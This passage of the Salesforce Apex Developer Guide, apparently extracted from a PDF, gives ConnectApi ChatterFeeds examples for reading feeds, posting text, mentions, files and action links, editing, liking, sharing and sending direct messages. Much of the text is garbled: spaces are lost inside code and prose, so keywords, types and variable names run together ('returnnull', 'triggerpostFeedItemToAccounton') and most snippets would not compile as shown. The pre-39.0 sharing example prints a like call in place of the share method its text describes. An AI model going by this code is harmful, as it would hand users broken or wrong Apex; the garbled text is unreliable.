Call a method to create a file with binary content in a Google Drive repository folder.
Update a Repository File Without Content (Metadata Only)
Call a method to update the metadata of a repository file.
Update a Repository File with Content
Call a method to update a repository file with content.
Get an Authentication URL
Call a method to get an authentication URL.
Resolve a Prompt Template
Call a method to resolve a prompt template.
Create a Cart and Cart Item with Custom Fields in a Commerce Store
Create a cart with a cart item using custom fields for a buyer or guest user in your Commerce store.
Get Feed Elements From a Feed
Call a method to get feed elements from a feed.
Call getFeedElementsFromFeed(communityId,feedType,subjectId) to get the first page of feed elements
from the context user’s news feed.
ConnectApi.FeedElementPagefep =
ConnectApi.ChatterFeeds.getFeedElementsFromFeed(Network.getNetworkId(),
ConnectApi.FeedType.News,'me');
The getFeedElementsFromFeed method is overloaded, which means that the method name has many different signatures. A
signature is the name of the method and its parameters in order.
Each signature lets you send different inputs. For example, one signature may specify the feed type and the subject ID. Another signature
could have those parameters and an additional parameter to specify the maximum number of comments to return for each feed element.
401
Using Salesforce Features with ApexApex Developer Guide

Tip:  Each signature operates on certain feed types. Use the signatures that operate on the ConnectApi.FeedType.Record
to get group feeds, since a group is a record type.
SEE ALSO:
Apex Reference Guide: ChatterFeeds Class
Get Feed Elements From Another User’s Feed
Call a method to get feed elements from another user’s feed.
Call getFeedElementsFromFeed(communityId,feedType,subjectId) to get the first page of feed elements
from another user’s feed.
ConnectApi.FeedElementPagefep =
ConnectApi.ChatterFeeds.getFeedElementsFromFeed(Network.getNetworkId(),
ConnectApi.FeedType.UserProfile,'005R0000000HwMA');
This example calls the same method to get the first page of feed elements from another user’s record feed.
ConnectApi.FeedElementPagefep =
ConnectApi.ChatterFeeds.getFeedElementsFromFeed(Network.getNetworkId(),
ConnectApi.FeedType.Record,'005R0000000HwMA');
The getFeedElementsFromFeed method is overloaded, which means that the method name has many different signatures. A
signature is the name of the method and its parameters in order.
Each signature lets you send different inputs. For example, one signature can specify the feed type and the subject ID. Another signature
could have those parameters and an extra parameter to specify the maximum number of comments to return for each feed element.
Get Site-Specific Feed Elements from a Feed
Call a method to display a user profile feed that contains only feed elements that are scoped to a specific Experience Cloud site.
Feed elements that have a User or a Group parent record are scoped to sites. Feed elements whose parents are record types other than
User or Group are always visible in all sites. Other parent record types could be scoped to sites in the future.
This example calls getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
density,pageParam,pageSize,sortParam,filter) to get only site-specific feed elements.
ConnectApi.FeedElementPagefep =
ConnectApi.ChatterFeeds.getFeedElementsFromFeed(Network.getNetworkId(),
ConnectApi.FeedType.UserProfile, 'me', 3, ConnectApi.FeedDensity.FewerUpdates,null, null,
ConnectApi.FeedSortOrder.LastModifiedDateDesc,ConnectApi.FeedFilter.CommunityScoped);
Post a Feed Element
Make a call to post a feed element.
Call postFeedElement(communityId,subjectId,feedElementType,text) to post a string of text.
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),'0F9d0000000TreH',
ConnectApi.FeedElementType.FeedItem,'On vacationthisweek.');
The second parameter, subjectId is the ID of the parent this feed element is posted to. The value can be the ID of a user, group, or
record, or the string me to indicate the context user.
402
Using Salesforce Features with ApexApex Developer Guide

Post a Feed Element with a Mention
Call a method or use the ConnectApiHelper repository to post a feed.
You can post feed elements with mentions two ways. Use the ConnectApiHelper repository on GitHub to write a single line of code, or
use this example, which calls postFeedElement(communityId,feedElement).
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.MentionSegmentInputmentionSegmentInput= new ConnectApi.MentionSegmentInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
mentionSegmentInput.id= '005RR000000Dme9';
messageBodyInput.messageSegments.add(mentionSegmentInput);
textSegmentInput.text= 'Couldyou takea look?';
messageBodyInput.messageSegments.add(textSegmentInput);
feedItemInput.body= messageBodyInput;
feedItemInput.feedElementType= ConnectApi.FeedElementType.FeedItem;
feedItemInput.subjectId= '0F9RR0000004CPw';
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),feedItemInput);
Post a Feed Element with Existing Files
Call a method to post a feed element with already uploaded files.
Call postFeedElement(communityId,feedElement) to post a feed item with files that have already been uploaded.
// Definethe FeedItemInputobjectto passto postFeedElement
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
feedItemInput.subjectId= 'me';
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
textSegmentInput.text= 'Wouldyou pleasereviewthesedocs?';
// The MessageBodyInputobjectholdsthe textin the post
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
messageBodyInput.messageSegments.add(textSegmentInput);
feedItemInput.body= messageBodyInput;
// The FeedElementCapabilitiesInputobjectholdsthe capabilitiesof the feeditem.
// For thisfeeditem,we definea filescapabilityto holdthe file(s).
List<String> fileIds= new List<String>();
fileIds.add('069xx00000000QO');
fileIds.add('069xx00000000QT');
fileIds.add('069xx00000000Qn');
fileIds.add('069xx00000000Qi');
fileIds.add('069xx00000000Qd');
403
Using Salesforce Features with ApexApex Developer Guide

ConnectApi.FilesCapabilityInputfilesInput= new ConnectApi.FilesCapabilityInput();
filesInput.items= new List<ConnectApi.FileIdInput>();
for (StringfileId: fileIds){
ConnectApi.FileIdInputidInput= new ConnectApi.FileIdInput();
idInput.id= fileId;
filesInput.items.add(idInput);
}
ConnectApi.FeedElementCapabilitiesInputfeedElementCapabilitiesInput= new
ConnectApi.FeedElementCapabilitiesInput();
feedElementCapabilitiesInput.files= filesInput;
feedItemInput.capabilities= feedElementCapabilitiesInput;
// Postthe feeditem.
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),feedItemInput);
Post a Rich-Text Feed Element with Inline Image
Call a method or use the ConnectApiHelper repository to post a feed element with an already uploaded, inline image.
You can post rich-text feed elements with inline images and mentions two ways. Use the ConnectApiHelper repository on GitHub to
write a single line of code, or use this example, which calls postFeedElement(communityId,feedElement). In this
example, the image file is existing content that has already been uploaded to Salesforce as a content document (069). The post also
includes text and a mention.
StringcommunityId= null;
StringimageId= '069D00000001INA';
StringmentionedUserId= '005D0000001QNpr';
StringtargetUserOrGroupOrRecordId= '005D0000001Gif0';
ConnectApi.FeedItemInputinput= new ConnectApi.FeedItemInput();
input.subjectId= targetUserOrGroupOrRecordId;
input.feedElementType= ConnectApi.FeedElementType.FeedItem;
ConnectApi.MessageBodyInputmessageInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegment;
ConnectApi.MentionSegmentInputmentionSegment;
ConnectApi.MarkupBeginSegmentInputmarkupBeginSegment;
ConnectApi.MarkupEndSegmentInputmarkupEndSegment;
ConnectApi.InlineImageSegmentInputinlineImageSegment;
messageInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
markupBeginSegment= new ConnectApi.MarkupBeginSegmentInput();
markupBeginSegment.markupType= ConnectApi.MarkupType.Bold;
messageInput.messageSegments.add(markupBeginSegment);
textSegment= new ConnectApi.TextSegmentInput();
textSegment.text= 'Hello';
messageInput.messageSegments.add(textSegment);
mentionSegment= new ConnectApi.MentionSegmentInput();
404
Using Salesforce Features with ApexApex Developer Guide

mentionSegment.id= mentionedUserId;
messageInput.messageSegments.add(mentionSegment);
textSegment= new ConnectApi.TextSegmentInput();
textSegment.text= '!';
messageInput.messageSegments.add(textSegment);
markupEndSegment= new ConnectApi.MarkupEndSegmentInput();
markupEndSegment.markupType= ConnectApi.MarkupType.Bold;
messageInput.messageSegments.add(markupEndSegment);
inlineImageSegment= new ConnectApi.InlineImageSegmentInput();
inlineImageSegment.altText= 'imageone';
inlineImageSegment.fileId= imageId;
messageInput.messageSegments.add(inlineImageSegment);
input.body= messageInput;
ConnectApi.ChatterFeeds.postFeedElement(communityId,input);
SEE ALSO:
Apex Reference Guide: ConnectApi.MarkupBeginSegmentInput
Apex Reference Guide: ConnectApi.MarkupEndSegmentInput
Apex Reference Guide: ConnectApi.InlineImageSegmentInput
Post a Rich-Text Feed Element with a Code Block
Call a method to post a feed element with a code block.
Call postFeedElement(communityId,feedElement) to post a feed item with a code block.
StringcommunityId= null;
StringtargetUserOrGroupOrRecordId= 'me';
StringcodeSnippet= '<html>\n\t<body>\n\t\tHello,world!\n\t</body>\n</html>';
ConnectApi.FeedItemInputinput= new ConnectApi.FeedItemInput();
input.subjectId= targetUserOrGroupOrRecordId;
input.feedElementType= ConnectApi.FeedElementType.FeedItem;
ConnectApi.MessageBodyInputmessageInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegment;
ConnectApi.MarkupBeginSegmentInputmarkupBeginSegment;
ConnectApi.MarkupEndSegmentInputmarkupEndSegment;
messageInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
markupBeginSegment= new ConnectApi.MarkupBeginSegmentInput();
markupBeginSegment.markupType= ConnectApi.MarkupType.Code;
messageInput.messageSegments.add(markupBeginSegment);
textSegment= new ConnectApi.TextSegmentInput();
textSegment.text= codeSnippet;
messageInput.messageSegments.add(textSegment);
405
Using Salesforce Features with ApexApex Developer Guide

markupEndSegment= new ConnectApi.MarkupEndSegmentInput();
markupEndSegment.markupType= ConnectApi.MarkupType.Code;
messageInput.messageSegments.add(markupEndSegment);
input.body= messageInput;
ConnectApi.ChatterFeeds.postFeedElement(communityId,input);
SEE ALSO:
Apex Reference Guide: ConnectApi.MarkupBeginSegmentInput
Apex Reference Guide: ConnectApi.MarkupEndSegmentInput
Post a Feed Element with a New File (Binary) Attachment
Call a method to post a feed element with a new file.
Important:  In version 36.0 and later, you can’t post a feed element with a new file in the same call. Upload files to Salesforce first,
and then specify existing files when posting a feed element.
This example calls postFeedElement(communityId,feedElement,feedElementFileUpload) to post a feed
item with a new file (binary) attachment.
ConnectApi.FeedItemInputinput= new ConnectApi.FeedItemInput();
input.subjectId= 'me';
ConnectApi.ContentCapabilityInputcontentInput= new ConnectApi.ContentCapabilityInput();
contentInput.title= 'Title';
ConnectApi.FeedElementCapabilitiesInputcapabilities= new
ConnectApi.FeedElementCapabilitiesInput();
capabilities.content= contentInput;
input.capabilities= capabilities;
Stringtext= 'Theseare the contentsof the new file.';
BlobmyBlob= Blob.valueOf(text);
ConnectApi.BinaryInputbinInput= new ConnectApi.BinaryInput(myBlob,'text/plain',
'fileName');
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),input,binInput);
Post a Batch of Feed Elements
Use a trigger to call a method to bulk post to the feeds of accounts.
This trigger calls postFeedElementBatch(communityId,feedElements) to bulk post to the feeds of newly inserted
accounts.
triggerpostFeedItemToAccounton Account(afterinsert) {
Account[]accounts= Trigger.new;
// Bulkpostto the accountfeeds.
406
Using Salesforce Features with ApexApex Developer Guide

List<ConnectApi.BatchInput>batchInputs= new List<ConnectApi.BatchInput>();
for (Accounta : accounts){
ConnectApi.FeedItemInputinput= new ConnectApi.FeedItemInput();
input.subjectId= a.id;
ConnectApi.MessageBodyInputbody= new ConnectApi.MessageBodyInput();
body.messageSegments= new List<ConnectApi.MessageSegmentInput>();
ConnectApi.TextSegmentInputtextSegment= new ConnectApi.TextSegmentInput();
textSegment.text= 'Let\'swin the ' + a.name+ ' account.';
body.messageSegments.add(textSegment);
input.body= body;
ConnectApi.BatchInputbatchInput= new ConnectApi.BatchInput(input);
batchInputs.add(batchInput);
}
ConnectApi.ChatterFeeds.postFeedElementBatch(Network.getNetworkId(),batchInputs);
}
Post a Batch of Feed Elements with a New (Binary) File
Use a trigger to call a method to bulk post a new file to the feeds of accounts.
Important:  This example is valid in version 32.0–35.0. In version 36.0 and later, you can’t post a batch of feed elements with a
new file in the same call. Upload the file to Salesforce first, and then specify the uploaded file when posting a batch of feed elements.
This trigger calls postFeedElementBatch(communityId,feedElements) to bulk post to the feeds of newly inserted
accounts. Each post has a new file (binary) attachment.
triggerpostFeedItemToAccountWithBinaryon Account(afterinsert) {
Account[]accounts= Trigger.new;
// Bulkpostto the accountfeeds.
List<ConnectApi.BatchInput>batchInputs= new List<ConnectApi.BatchInput>();
for (Accounta : accounts){
ConnectApi.FeedItemInputinput= new ConnectApi.FeedItemInput();
input.subjectId= a.id;
ConnectApi.MessageBodyInputbody= new ConnectApi.MessageBodyInput();
body.messageSegments= new List<ConnectApi.MessageSegmentInput>();
ConnectApi.TextSegmentInputtextSegment= new ConnectApi.TextSegmentInput();
textSegment.text= 'Let\'swin the ' + a.name+ ' account.';
body.messageSegments.add(textSegment);
input.body= body;
ConnectApi.ContentCapabilityInputcontentInput= new
407
Using Salesforce Features with ApexApex Developer Guide

ConnectApi.ContentCapabilityInput();
contentInput.title= 'Title';
ConnectApi.FeedElementCapabilitiesInputcapabilities= new
ConnectApi.FeedElementCapabilitiesInput();
capabilities.content= contentInput;
input.capabilities= capabilities;
Stringtext= 'We are wordsin a file.';
BlobmyBlob= Blob.valueOf(text);
ConnectApi.BinaryInputbinInput= new ConnectApi.BinaryInput(myBlob,'text/plain',
'fileName');
ConnectApi.BatchInputbatchInput= new ConnectApi.BatchInput(input,binInput);
batchInputs.add(batchInput);
}
ConnectApi.ChatterFeeds.postFeedElementBatch(Network.getNetworkId(),batchInputs);
Define an Action Link and Post with a Feed Element
Create one action link in an action link group, associate the action link group with a feed item, and post the feed item.
408
Using Salesforce Features with ApexApex Developer Guide

When a user clicks the action link, the action link requests the Connect REST API resource /chatter/feed-elements, which
posts a feed item to the user’s feed. After the user clicks the action link and it executes successfully, its status changes to successful and
the feed item UI is updated.
Refresh the user’s feed to see the new post.
409
Using Salesforce Features with ApexApex Developer Guide

This simple example shows you how to use action links to call a Salesforce resource.
Think of an action link as a button on a feed item. Like a button, an action link definition includes a label (labelKey). An action link
group definition also includes other properties like a URL (actionUrl), an HTTP method (method), and an optional request body
(requestBody) and HTTP headers (headers).
When a user clicks this action link, an HTTP POST request is made to a Connect REST API resource, which posts a feed item to Chatter.
The requestBody property holds the request body for the actionUrl resource, including the text of the new feed item. In this
example, the new feed item includes only text, but it could include other capabilities such as a file attachment, a poll, or even action
links.
Just like radio buttons, action links must be nested in a group. Action links within a group share the properties of the group and are
mutually exclusive (you can click only one action link within a group). Even if you define only one action link, it must be part of an action
link group.
This example calls ConnectApi.ActionLinks.createActionLinkGroupDefinition(communityId,
actionLinkGroup) to create an action link group definition.
It saves the action link group ID from that call and associates it with a feed element in a call to
ConnectApi.ChatterFeeds.postFeedElement(communityId,feedElement).
To use this code, substitute an OAuth value for your own Salesforce org. Also, verify that the expirationDate is in the future. Look
for the “To Do” comments in the code.
ConnectApi.ActionLinkGroupDefinitionInputactionLinkGroupDefinitionInput= new
ConnectApi.ActionLinkGroupDefinitionInput();
ConnectApi.ActionLinkDefinitionInputactionLinkDefinitionInput= new
ConnectApi.ActionLinkDefinitionInput();
ConnectApi.RequestHeaderInputrequestHeaderInput1= new ConnectApi.RequestHeaderInput();
ConnectApi.RequestHeaderInputrequestHeaderInput2= new ConnectApi.RequestHeaderInput();
// Createthe actionlinkgroupdefinition.
actionLinkGroupDefinitionInput.actionLinks= New
List<ConnectApi.ActionLinkDefinitionInput>();
actionLinkGroupDefinitionInput.executionsAllowed=
ConnectApi.ActionLinkExecutionsAllowed.OncePerUser;
actionLinkGroupDefinitionInput.category= ConnectApi.PlatformActionGroupCategory.Primary;
//To Do: Verifythatthe dateis in the future.
// Actionlinkgroupsare removedfromfeedelementson the expirationdate.
datetimemyDate= datetime.newInstance(2016,3, 1);
actionLinkGroupDefinitionInput.expirationDate= myDate;
// Createthe actionlinkdefinition.
actionLinkDefinitionInput.actionType= ConnectApi.ActionLinkType.Api;
actionLinkDefinitionInput.actionUrl= '/services/data/v33.0/chatter/feed-elements';
actionLinkDefinitionInput.headers= new List<ConnectApi.RequestHeaderInput>();
actionLinkDefinitionInput.labelKey= 'Post';
actionLinkDefinitionInput.method= ConnectApi.HttpRequestMethod.HttpPost;
actionLinkDefinitionInput.requestBody= '{\"subjectId\":\"me\",\"feedElementType\":
\"FeedItem\",\"body\":{\"messageSegments\":[{\"type\":\"Text\",\"text\":\"Thisis a
testpostcreatedvia an API actionlink.\"}]}}';
actionLinkDefinitionInput.requiresConfirmation= true;
//To Do: Substitutean OAuthvaluefor yourSalesforceorg.
requestHeaderInput1.name= 'Authorization';
requestHeaderInput1.value= 'OAuth
00DD00000007WNP!ARsAQCwoeV0zzAV847FTl4zF.85w.EwsPbUgXR4SAjsp';
410
Using Salesforce Features with ApexApex Developer Guide

actionLinkDefinitionInput.headers.add(requestHeaderInput1);
requestHeaderInput2.name= 'Content-Type';
requestHeaderInput2.value= 'application/json';
actionLinkDefinitionInput.headers.add(requestHeaderInput2);
// Add the actionlinkdefinitionto the actionlinkgroupdefinition.
actionLinkGroupDefinitionInput.actionLinks.add(actionLinkDefinitionInput);
// Instantiatethe actionlinkgroupdefinition.
ConnectApi.ActionLinkGroupDefinitionactionLinkGroupDefinition=
ConnectApi.ActionLinks.createActionLinkGroupDefinition(Network.getNetworkId(),
actionLinkGroupDefinitionInput);
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.FeedElementCapabilitiesInputfeedElementCapabilitiesInput= new
ConnectApi.FeedElementCapabilitiesInput();
ConnectApi.AssociatedActionsCapabilityInputassociatedActionsCapabilityInput= new
ConnectApi.AssociatedActionsCapabilityInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
// Set the propertiesof the feedItemInputobject.
feedItemInput.body= messageBodyInput;
feedItemInput.capabilities= feedElementCapabilitiesInput;
feedItemInput.subjectId= 'me';
// Createthe textfor the post.
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
textSegmentInput.text= 'Clickto posta feeditem.';
messageBodyInput.messageSegments.add(textSegmentInput);
// The feedElementCapabilitiesInputobjectholdsthe capabilitiesof the feeditem.
// Definean associatedactionscapabilityto holdthe actionlinkgroup.
// The actionlinkgroupID is returnedfromthe callto createthe actionlinkgroup
definition.
feedElementCapabilitiesInput.associatedActions= associatedActionsCapabilityInput;
associatedActionsCapabilityInput.actionLinkGroupIds= new List<String>();
associatedActionsCapabilityInput.actionLinkGroupIds.add(actionLinkGroupDefinition.id);
// Postthe feeditem.
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),feedItemInput);
Note:  If the post fails, check the OAuth ID.
Define an Action Link in a Template and Post with a Feed Element
Create an action link and action link group and instantiate the action link group from a template.
This example creates the same action link and action link group as the example Define an Action Link and Post with a Feed Element,
but this example instantiates the action link group from a template.
411
Using Salesforce Features with ApexApex Developer Guide

Step 1: Create the Action Link Templates
1.From Setup, enter ActionLinkTemplates in the QuickFind box, then select Action Link Templates.
2.Use these values in a new Action Link Group Template:
ValueField
Doc ExampleName
Doc_ExampleDeveloper Name
Primary actionCategory
Once per UserExecutions Allowed
3.Use these values in a new Action Link Template:
ValueField
Doc ExampleAction Link Group Template
ApiAction Type
/services/data/{!Bindings.ApiVersion}/chatter/feed-elementsAction URL
Everyone can seeUser Visibility
{ "subjectId":"{!Bindings.SubjectId}",
"feedElementType":"FeedItem", "body":{ "messageSegments":[
{ "type":"Text", "text":"{!Bindings.Text}" } ] } }
HTTP Request Body
Content-Type: application/jsonHTTP Headers
0Position
PostLabel Key
POSTHTTP Method
4.Go back to the Action Link Group Template and select Published. Click Save.
Step 2: Instantiate the Action Link Group, Associate it with a Feed Item, and Post it
This example calls ConnectApi.ActionLinks.createActionLinkGroupDefinition(communityId,
actionLinkGroup) to create an action link group definition.
It calls ConnectApi.ChatterFeeds.postFeedElement(communityId,feedElement) to associate the action
link group with a feed item and post it.
// Get the actionlinkgrouptemplateId.
ActionLinkGroupTemplatetemplate= [SELECTId FROMActionLinkGroupTemplateWHERE
DeveloperName='Doc_Example'];
// Add bindingname-valuepairsto a map.
412
Using Salesforce Features with ApexApex Developer Guide

// The namesare definedin the actionlinktemplate(s)associatedwiththe actionlink
grouptemplate.
// Get themfromSetupUI or SOQL.
Map<String, String> bindingMap= new Map<String, String>();
bindingMap.put('ApiVersion', 'v33.0');
bindingMap.put('Text', 'Thispostwas createdby an API actionlink.');
bindingMap.put('SubjectId', 'me');
// CreateActionLinkTemplateBindingInputobjectsfromthe map elements.
List<ConnectApi.ActionLinkTemplateBindingInput>bindingInputs= new
List<ConnectApi.ActionLinkTemplateBindingInput>();
for (Stringkey : bindingMap.keySet()){
ConnectApi.ActionLinkTemplateBindingInputbindingInput= new
ConnectApi.ActionLinkTemplateBindingInput();
bindingInput.key= key;
bindingInput.value= bindingMap.get(key);
bindingInputs.add(bindingInput);
}
// Set the templateId and templatebindingvaluesin the actionlinkgroupdefinition.
ConnectApi.ActionLinkGroupDefinitionInputactionLinkGroupDefinitionInput= new
ConnectApi.ActionLinkGroupDefinitionInput();
actionLinkGroupDefinitionInput.templateId= template.id;
actionLinkGroupDefinitionInput.templateBindings= bindingInputs;
// Instantiatethe actionlinkgroupdefinition.
ConnectApi.ActionLinkGroupDefinitionactionLinkGroupDefinition=
ConnectApi.ActionLinks.createActionLinkGroupDefinition(Network.getNetworkId(),
actionLinkGroupDefinitionInput);
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.FeedElementCapabilitiesInputfeedElementCapabilitiesInput= new
ConnectApi.FeedElementCapabilitiesInput();
ConnectApi.AssociatedActionsCapabilityInputassociatedActionsCapabilityInput= new
ConnectApi.AssociatedActionsCapabilityInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
// Definethe FeedItemInputobjectto passto postFeedElement
feedItemInput.body= messageBodyInput;
feedItemInput.capabilities= feedElementCapabilitiesInput;
feedItemInput.subjectId= 'me';
// The MessageBodyInputobjectholdsthe textin the post
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
textSegmentInput.text= 'Clickto posta feeditem.';
messageBodyInput.messageSegments.add(textSegmentInput);
// The FeedElementCapabilitiesInputobjectholdsthe capabilitiesof the feeditem.
// For thisfeeditem,we definean associatedactionscapabilityto holdthe actionlink
group.
413
Using Salesforce Features with ApexApex Developer Guide

// The actionlinkgroupID is returnedfromthe callto createthe actionlinkgroup
definition.
feedElementCapabilitiesInput.associatedActions= associatedActionsCapabilityInput;
associatedActionsCapabilityInput.actionLinkGroupIds= new List<String>();
associatedActionsCapabilityInput.actionLinkGroupIds.add(actionLinkGroupDefinition.id);
// Postthe feeditem.
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),feedItemInput);
Edit a Feed Element
Call a method to edit a feed element.
Call updateFeedElement(communityId,feedElementId,feedElement) to edit a feed element. Feed items are
the only type of feed element that can be edited.
StringcommunityId= Network.getNetworkId();
// Get the lastfeeditemcreatedby the contextuser.
List<FeedItem>feedItems= [SELECTId FROMFeedItemWHERECreatedById= :UserInfo.getUserId()
ORDERBY CreatedDateDESC];
if (feedItems.isEmpty()){
// Returnnullwithinanonymousapex.
returnnull;
}
StringfeedElementId= feedItems[0].id;
ConnectApi.FeedEntityIsEditableisEditable=
ConnectApi.ChatterFeeds.isFeedElementEditableByMe(communityId,feedElementId);
if (isEditable.isEditableByMe== true){
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
textSegmentInput.text= 'Thisis my editedpost.';
messageBodyInput.messageSegments.add(textSegmentInput);
feedItemInput.body= messageBodyInput;
ConnectApi.FeedElementeditedFeedElement=
ConnectApi.ChatterFeeds.updateFeedElement(communityId,feedElementId,feedItemInput);
}
Edit a Question Title and Post
Call a method to edit a question title and post.
Call updateFeedElement(communityId,feedElementId,feedElement) to edit a question title and post.
StringcommunityId= Network.getNetworkId();
414
Using Salesforce Features with ApexApex Developer Guide

// Get the lastfeeditemcreatedby the contextuser.
List<FeedItem>feedItems= [SELECTId FROMFeedItemWHERECreatedById= :UserInfo.getUserId()
ORDERBY CreatedDateDESC];
if (feedItems.isEmpty()){
// Returnnullwithinanonymousapex.
returnnull;
}
StringfeedElementId= feedItems[0].id;
ConnectApi.FeedEntityIsEditableisEditable=
ConnectApi.ChatterFeeds.isFeedElementEditableByMe(communityId,feedElementId);
if (isEditable.isEditableByMe== true){
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.FeedElementCapabilitiesInputfeedElementCapabilitiesInput= new
ConnectApi.FeedElementCapabilitiesInput();
ConnectApi.QuestionAndAnswersCapabilityInputquestionAndAnswersCapabilityInput= new
ConnectApi.QuestionAndAnswersCapabilityInput();
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
textSegmentInput.text= 'Thisis my editedquestion.';
messageBodyInput.messageSegments.add(textSegmentInput);
feedItemInput.body= messageBodyInput;
feedItemInput.capabilities= feedElementCapabilitiesInput;
feedElementCapabilitiesInput.questionAndAnswers= questionAndAnswersCapabilityInput;
questionAndAnswersCapabilityInput.questionTitle= 'Whereis my editedquestion?';
ConnectApi.FeedElementeditedFeedElement=
ConnectApi.ChatterFeeds.updateFeedElement(communityId,feedElementId,feedItemInput);
}
Like a Feed Element
Call a method to like a feed element.
Call likeFeedElement(communityId,feedElementId) to like a feed element.
ConnectApi.ChatterLikechatterLike= ConnectApi.ChatterFeeds.likeFeedElement(null,
'0D5D0000000KuGh');
Bookmark a Feed Element
Call a method to bookmark a feed element.
Call updateFeedElementBookmarks(communityId,feedElementId,isBookmarkedByCurrentUser) to
bookmark a feed element.
ConnectApi.BookmarksCapabilitybookmark=
ConnectApi.ChatterFeeds.updateFeedElementBookmarks(null, '0D5D0000000KuGh', true);
415
Using Salesforce Features with ApexApex Developer Guide

Share a Feed Element (prior to Version 39.0)
Call a method to share a feed element.
Important:  In API version 39.0 and later, shareFeedElement(communityId,subjectId,feedElementType,
originalFeedElementId) isn’t supported. See Share a Feed Element (in Version 39.0 and Later).
Call shareFeedElement(communityId,subjectId,feedElementType,originalFeedElementId) to
share a feed item (which is a type of feed element) with a group.
ConnectApi.ChatterLikechatterLike= ConnectApi.ChatterFeeds.likeFeedElement(null,
'0D5D0000000KuGh');
Share a Feed Element (in Version 39.0 and Later)
Call a method to share a feed element.
Call postFeedElement(communityId,feedElement) to share a feed element.
// Definethe FeedItemInputobjectto passto postFeedElement
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
feedItemInput.subjectId= 'me';
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
textSegmentInput.text= 'Lookat thispostI'm sharing.';
// The MessageBodyInputobjectholdsthe textin the post
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
messageBodyInput.messageSegments.add(textSegmentInput);
feedItemInput.body= messageBodyInput;
ConnectApi.FeedEntityShareCapabilityInputshareInput= new
ConnectApi.FeedEntityShareCapabilityInput();
shareInput.feedEntityId= '0D5R0000000SEbc';
ConnectApi.FeedElementCapabilitiesInputfeedElementCapabilitiesInput= new
ConnectApi.FeedElementCapabilitiesInput();
feedElementCapabilitiesInput.feedEntityShare= shareInput;
feedItemInput.capabilities= feedElementCapabilitiesInput;
// Postthe feeditem.
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),feedItemInput);
Send a Direct Message
Call a method to send a direct message.
Call postFeedElement(communityId,feedElement) to send a direct message to two people.
// Definethe FeedItemInputobjectto passto postFeedElement
ConnectApi.FeedItemInputfeedItemInput= new ConnectApi.FeedItemInput();
ConnectApi.TextSegmentInputtextSegmentInput= new ConnectApi.TextSegmentInput();
textSegmentInput.text= 'Thanksfor attendingmy presentationtestrun thismorning.Send
me any feedback.';
// The MessageBodyInputobjectholdsthe textin the post
ConnectApi.MessageBodyInputmessageBodyInput= new ConnectApi.MessageBodyInput();
416
Using Salesforce Features with ApexApex Developer Guide

messageBodyInput.messageSegments= new List<ConnectApi.MessageSegmentInput>();
messageBodyInput.messageSegments.add(textSegmentInput);
feedItemInput.body= messageBodyInput;
// The FeedElementCapabilitiesInputobjectholdsthe capabilitiesof the feeditem.
// For thisfeeditem,we definea directmessagecapabilityto holdthe member(s)and the
subject.
List<String> memberIds= new List<String>();
memberIds.add('005B00000016OUQ');
memberIds.add('005B0000001rIN6');
ConnectApi.DirectMessageCapabilityInputdmInput= new
ConnectApi.DirectMessageCapabilityInput();
dmInput.subject= 'Thankyou!';
dmInput.membersToAdd= memberIds;
ConnectApi.FeedElementCapabilitiesInputfeedElementCapabilitiesInput= new
ConnectApi.FeedElementCapabilitiesInput();
feedElementCapabilitiesInput.directMessage= dmInput;
feedItemInput.capabilities= feedElementCapabilitiesInput;
// Postthe feeditem.
ConnectApi.FeedElementfeedElement=
ConnectApi.ChatterFeeds.postFeedElement(Network.getNetworkId(),feedItemInput);
